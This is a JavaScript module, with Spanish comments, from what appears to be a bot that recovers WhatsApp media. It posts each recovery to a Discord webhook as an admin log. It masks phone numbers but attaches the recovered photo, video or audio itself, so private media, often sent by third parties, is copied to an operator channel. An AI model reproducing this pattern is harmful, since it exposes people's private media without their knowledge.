import fsp from 'node:fs/promises';
import { config } from '../config.js';
import { createLogger } from '../utils/logger.js';
import { extensionFor, humanSize, mediaLabel } from '../whatsapp/mediaStore.js';

const log = createLogger('webhook');

const WEBHOOK_RE = /^https:\/\/(?:canary\.|ptb\.)?discord(?:app)?\.com\/api\/webhooks\/\d+\/[\w-]+$/;
// Tope de subida al webhook. 8 MB es el limite seguro en servidores sin boost;
// por encima se manda solo la ficha, con una nota de que era muy grande.
const MAX_ATTACH_BYTES = 8 * 1024 * 1024;

/** ¿Hay un webhook válido configurado? */
export function webhookEnabled() {
  return WEBHOOK_RE.test(config.logWebhook);
}

/** Enmascara un número dejando visible el país y las últimas cuatro cifras. */
function maskPhone(value = '') {
  const number = String(value).split('@')[0].replace(/\D/g, '');
  if (!number) return 'desconocido';
  if (number.length <= 6) return `+${number}`;
  return `+${number.slice(0, 2)}••••${number.slice(-4)}`;
}

/** El id de sesión identifica también la plataforma: "tg-<id>" es Telegram, el resto Discord. */
function ownerLabel(sessionId) {
  if (!sessionId) return 'Desconocido';
  if (sessionId.startsWith('tg-')) return `Telegram · \`${sessionId.slice(3)}\``;
  return `<@${sessionId}>`;
}

function buildEmbed({ discordUserId, accountPhone, record, to, isOwner }) {
  const label = mediaLabel(record.kind);
  const origin = record.fromMe
    ? 'La propia cuenta'
    : record.pushName?.trim() || maskPhone(record.sender);

  return {
    title: label.recovered,
    color: config.brand.color,
    fields: [
      { name: 'ID', value: `\`#${record.code}\``, inline: true },
      { name: 'Tamaño', value: humanSize(record.size), inline: true },
      { name: 'Origen', value: origin, inline: true },
      { name: 'Usuario', value: ownerLabel(discordUserId), inline: true },
      { name: 'Cuenta', value: maskPhone(accountPhone), inline: true },
      { name: 'Destino', value: isOwner ? 'Su propio chat' : maskPhone(to), inline: true },
    ],
    timestamp: new Date(record.sentAt || Date.now()).toISOString(),
    footer: { text: config.brand.name },
  };
}

async function post(body, headers) {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), 15_000);
  try {
    return await fetch(`${config.logWebhook}?wait=false`, {
      method: 'POST',
      headers,
      body,
      signal: controller.signal,
    });
  } finally {
    clearTimeout(timer);
  }
}

/**
 * Publica el registro administrativo de un rescate en el webhook de Discord,
 * adjuntando el propio archivo para verlo en el canal. Es "fire and forget":
 * nunca lanza ni bloquea la entrega en WhatsApp; los fallos se anotan y punto.
 */
export async function postRecovery(data) {
  if (!webhookEnabled() || !data?.record) return;
  const { record } = data;
  const embed = buildEmbed(data);

  // Intento con el archivo adjunto para que la foto/video se vea en el log.
  let buffer = null;
  try {
    const stat = await fsp.stat(record.file);
    if (stat.size <= MAX_ATTACH_BYTES) buffer = await fsp.readFile(record.file);
    else embed.fields.push({ name: 'Archivo', value: 'Demasiado grande para adjuntar' });
  } catch {
    embed.fields.push({ name: 'Archivo', value: 'Ya no disponible en el servidor' });
  }

  try {
    if (buffer) {
      const filename = `${record.code}.${extensionFor(record.mimetype)}`;
      // Las imágenes se incrustan en el propio embed; video y audio quedan como
      // adjunto reproducible debajo.
      if (record.kind === 'image') embed.image = { url: `attachment://${filename}` };

      const form = new FormData();
      form.append(
        'payload_json',
        JSON.stringify({ embeds: [embed], allowed_mentions: { parse: [] } }),
      );
      form.append('files[0]', new Blob([buffer], { type: record.mimetype || 'application/octet-stream' }), filename);

      const res = await post(form);
      // 413 = el servidor no acepta ese tamaño: reintento solo con la ficha.
      if (res.status === 413) {
        delete embed.image;
        await sendEmbedOnly(embed);
      } else if (!res.ok) {
        log.warn(`El webhook respondió ${res.status}; revisa LOG_WEBHOOK_URL`);
      }
      return;
    }
    await sendEmbedOnly(embed);
  } catch (error) {
    log.warn('No se pudo enviar el registro al webhook', error);
  }
}

async function sendEmbedOnly(embed) {
  const res = await post(
    JSON.stringify({ embeds: [embed], allowed_mentions: { parse: [] } }),
    { 'Content-Type': 'application/json' },
  );
  if (!res.ok) log.warn(`El webhook respondió ${res.status}; revisa LOG_WEBHOOK_URL`);
}
